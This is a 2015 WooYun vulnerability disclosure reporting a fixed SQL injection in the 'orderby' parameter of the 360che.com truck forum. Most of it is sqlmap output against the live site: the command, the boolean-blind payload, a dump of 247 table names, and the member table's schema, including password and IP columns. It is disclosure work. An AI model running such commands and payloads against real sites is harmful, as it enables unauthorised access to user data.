{"id": 72207, "wybug_id": "wooyun-2015-0158872", "wybug_title": "卡车之家论坛存在sql注入（泄露大量用户信息）", "wybug_corp": "360che.com", "wybug_author": "路人甲", "wybug_date": "2015-12-21 17:01", "wybug_open_date": "2015-12-21 17:13", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 做好安全 详细说明：  orderby参数存在注入----------------------root@attack:~# sqlmap -u \"http://bbs.360che.com/clublist.php?clubid=57&orderby=lastpost\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150918}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:35:59[15:35:59] [INFO] testing connection to the target URL[15:36:01] [INFO] testing if the target URL is stable[15:36:01] [INFO] target URL is stable[15:36:01] [INFO] testing if GET parameter 'clubid' is dynamic[15:36:03] [INFO] confirming that GET parameter 'clubid' is dynamic[15:36:04] [INFO] GET parameter 'clubid' is dynamic[15:36:06] [WARNING] reflective value(s) found and filtering out[15:36:07] [WARNING] heuristic (basic) test shows that GET parameter 'clubid' might not be injectable[15:36:07] [INFO] testing for SQL injection on GET parameter 'clubid'[15:36:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[15:36:15] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'[15:36:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[15:36:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[15:36:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[15:36:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[15:36:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[15:36:34] [INFO] testing 'MySQL inline queries'[15:36:35] [INFO] testing 'PostgreSQL inline queries'[15:36:36] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[15:36:38] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[15:36:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'[15:36:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'[15:36:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'[15:36:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[15:36:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[15:36:57] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[15:37:00] [INFO] testing 'Oracle AND time-based blind'[15:37:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[15:37:04] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[15:37:40] [INFO] target URL appears to be UNION injectable with 1 columns[15:37:40] [WARNING] applying generic concatenation with double pipes ('||')[15:37:42] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') [15:37:49] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[15:38:35] [WARNING] GET parameter 'clubid' is not injectable[15:38:35] [INFO] testing if GET parameter 'orderby' is dynamic[15:38:35] [INFO] confirming that GET parameter 'orderby' is dynamic[15:38:35] [WARNING] GET parameter 'orderby' does not appear dynamic[15:38:35] [WARNING] heuristic (basic) test shows that GET parameter 'orderby' might not be injectable[15:38:35] [INFO] testing for SQL injection on GET parameter 'orderby'[15:38:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[15:38:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'[15:38:41] [INFO] GET parameter 'orderby' seems to be 'MySQL >= 5.0 boolean-based blind - Parameter replace' injectable it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [15:39:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[15:39:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[15:40:00] [INFO] checking if the injection point on GET parameter 'orderby' is a false positiveGET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 267 HTTP(s) requests:---Parameter: orderby (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: clubid=57&orderby=(SELECT (CASE WHEN (2508=2508) THEN 2508 ELSE 2508*(SELECT 2508 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---[15:40:48] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.6.14, Nginxback-end DBMS: MySQL 5.0[15:40:48] [INFO] fetched data logged to text files under '/root/.sqlmap/output/bbs.360che.com'[*] shutting down at 15:40:48---------------------------------------------------------------------current database:    '360che'-------------------------------------Database: 360che[247 tables]+------------------------+| area                   || bbsatt                 || cdb_access             || cdb_activities         || cdb_activityapplies    || cdb_adminactions       || cdb_admincustom        || cdb_admingroups        || cdb_adminnotes         || cdb_adminsessions      || cdb_advcaches          || cdb_advertisements     || cdb_album              || cdb_announcements      || cdb_api_qq             || cdb_api_user           || cdb_api_weixin         || cdb_apply              || cdb_applyapplies       || cdb_attachments        || cdb_attachpaymentlog   || cdb_attachtypes        || cdb_auman_log          || cdb_band               || cdb_banned             || cdb_bbcodes            || cdb_beginmembers       || cdb_beginmemdong       || cdb_caches             || cdb_calculator         || cdb_campaigns          || cdb_chebiao            || cdb_checkin            || cdb_checkin_1          || cdb_checkin_2          || cdb_checkin_3          || cdb_checkuser          || cdb_clubre             || cdb_complainlog        || cdb_creditslog         || cdb_crons              || cdb_dailypoststj       || cdb_debateposts        || cdb_debates            || cdb_failedlogins       || cdb_faqs               || cdb_favorites          || cdb_feedback           || cdb_forumfields        || cdb_forumlinks         || cdb_forumrecommend     || cdb_forums             || cdb_handworkcontent    || cdb_hiddentie          || cdb_imagetypes         || cdb_invites            || cdb_itempool           || cdb_logintel           || cdb_loginthird         || cdb_loginthirdtj       || cdb_magiclog           || cdb_magicmarket        || cdb_magics             || cdb_medallog           || cdb_medals             || cdb_memberfields       || cdb_membermagics       || cdb_membermedals       || cdb_members            || cdb_memberspaces       || cdb_memberspwd         || cdb_membersrecords     || cdb_moderators         || cdb_modworks           || cdb_mvisit             || cdb_myposts            || cdb_mytasks            || cdb_mythreads          || cdb_navs               || cdb_newmembers         || cdb_newpostcomment     || cdb_online             || cdb_onlinelist         || cdb_onlinemember       || cdb_onlinetime         || cdb_onlinetourist      || cdb_operation          || cdb_opreason           || cdb_oprecords          || cdb_orders             || cdb_paymentlog         || cdb_pluginhooks        || cdb_plugins            || cdb_pluginvars         || cdb_pms_jinggao        || cdb_polloptions        || cdb_polls              || cdb_position           || cdb_postcomment        || cdb_posts              || cdb_profilefields      || cdb_projects           || cdb_promotions         || cdb_ranks              || cdb_ratelog            || cdb_regips             || cdb_register_log       || cdb_relatedthreads     || cdb_renzheng           || cdb_renzheng_img       || cdb_reportlog          || cdb_request            || cdb_rewardlog          || cdb_rsscaches          || cdb_saveposts          || cdb_searchfull         || cdb_searchindex        || cdb_sessions           || cdb_settings           || cdb_sgmembers          || cdb_sgposts            || cdb_sgthreads          || cdb_shippingaddress    || cdb_sjyz               || cdb_smilies            || cdb_spacecaches        || cdb_specialuser        || cdb_statistics         || cdb_stats              || cdb_statvars           || cdb_styles             || cdb_stylevars          || cdb_subscriptions      || cdb_tags               || cdb_tagsbakbak         || cdb_tagstags           || cdb_tasks              || cdb_taskvars           || cdb_templates          || cdb_threads            || cdb_threadsclubread    || cdb_threadsmod         || cdb_threadspass        || cdb_threadtags         || cdb_threadtagsbak      || cdb_threadtypes        || cdb_tousu              || cdb_tradecomments      || cdb_tradelog           || cdb_tradeoptionvars    || cdb_trades             || cdb_tuigao             || cdb_typemodels         || cdb_typeoptions        || cdb_typeoptionvars     || cdb_typevars           || cdb_usedcars           || cdb_usergroups         || cdb_validating         || cdb_videos             || cdb_videotags          || cdb_virtualforums      || cdb_warnings           || cdb_words              || checkin_1              || city                   || ditu                   || mobile                 || mobile_area_log_151110 || province               || shouji                 || tianyamember           || tmp_regstatistics      || topic_inter_log        || uc_admins              || uc_applications        || uc_badwords            || uc_domains             || uc_failedlogins        || uc_feeds               || uc_friends             || uc_mailqueue           || uc_memberfields        || uc_members             || uc_members20120117     || uc_members20130702     || uc_members_11          || uc_mergemembers        || uc_newpm               || uc_newpm_bak           || uc_notelist            || uc_pms                 || uc_protectedmembers    || uc_settings            || uc_sqlcache            || uc_tags                || uc_vars                || wiki_aaa_answer        || wiki_aaa_ask           || wiki_activation        || wiki_advertisement     || wiki_attachment        || wiki_autosave          || wiki_banned            || wiki_blacklist         || wiki_block             || wiki_category          || wiki_categorylink      || wiki_channel           || wiki_comment           || wiki_creditdetail      || wiki_datacall          || wiki_doc               || wiki_docfavorite       || wiki_docreference      || wiki_edition           || wiki_focus             || wiki_friendlink        || wiki_gift              || wiki_giftlog           || wiki_innerlinkcache    || wiki_language          || wiki_lock              || wiki_mailqueue         || wiki_nav               || wiki_navlink           || wiki_navmodel          || wiki_plugin            || wiki_pluginhook        || wiki_pluginvar         || wiki_pms               || wiki_privatetitle      || wiki_recycle           || wiki_regular           || wiki_regular_relation  || wiki_regulargroup      || wiki_relation          || wiki_session           || wiki_setting           || wiki_synonym           || wiki_task              || wiki_theme             || wiki_uniontitle        || wiki_user              || wiki_usergroup         || wiki_visitlist         || wiki_word              |+------------------------+ 200多个表----------------------------------------------30[18:13:18] [INFO] retrieved: uid[18:13:29] [INFO] retrieved: mediumint(8) unsigned[18:14:42] [INFO] retrieved: username[18:15:09] [INFO] retrieved: char(20)[18:15:36] [INFO] retrieved: password[18:16:08] [INFO] retrieved: char(32)[18:16:35] [INFO] retrieved: email[18:16:52] [INFO] retrieved: char(50)[18:17:18] [INFO] retrieved: gender[18:17:39] [INFO] retrieved: tinyint(1)[18:18:12] [INFO] retrieved: credit2[18:18:36] [INFO] retrieved: int(10)[18:18:58] [INFO] retrieved: birthday[18:19:26] [INFO] retrieved: int(10) unsigned[18:20:24] [INFO] retrieved: image[18:20:43] [INFO] retrieved: varchar(255)[18:21:20] [INFO] retrieved: location[18:21:48] [INFO] retrieved: varchar(30)[18:22:23] [INFO] retrieved: regip[18:22:46] [INFO] retrieved: char(15)[18:23:11] [INFO] retrieved: regtime[18:23:37] [INFO] retrieved: int(10) unsigned[18:24:28] [INFO] retrieved: lastip[18:24:51] [INFO] retrieved: char(15)[18:25:35] [INFO] retrieved: lasttime[18:26:17] [INFO] retrieved: int(10) unsigned[18:27:09] [INFO] retrieved: groupid[18:27:34] [INFO] retrieved: smallint(6) unsigned[18:28:53] [INFO] retrieved: timeoffset[18:29:29] [INFO] retrieved: varchar(20)[18:30:08] [INFO] retrieved: style[18:30:25] [INFO] retrieved: varchar(20)[18:31:01] [INFO] retrieved: language[18:31:29] [INFO] retrieved: varchar(20)[18:32:07] [INFO] retrieved: signature[18:32:39] [INFO] retrieved: text[18:32:54] [INFO] retrieved: creates[18:33:19] [INFO] retrieved: mediumint(8) unsigned[18:34:28] [INFO] retrieved: edits[18:34:46] [INFO] retrieved: mediumint(8) unsigned[18:35:53] [INFO] retrieved: views[18:36:09] [INFO] retrieved: int(10) unsigned[18:37:01] [INFO] retrieved: checkup[18:37:26] [INFO] retrieved: int^C[18:37:39] [ERROR] user aborted-------------------------------------------------------------\n\n不知道这个库和卡车之家商城同一个库布 ，同一个库直接影响商城网站----------------------------------由于要上课了就不继续深入了，厂商有什么补充或者疑问可以联系我。rank能不能高一点。。。。。。   漏洞证明：  \n\n   修复方案：  你们更专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-12-21 17:12 厂商回复： 多谢反馈 最新状态： 2015-12-21：已修复,多谢反馈  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}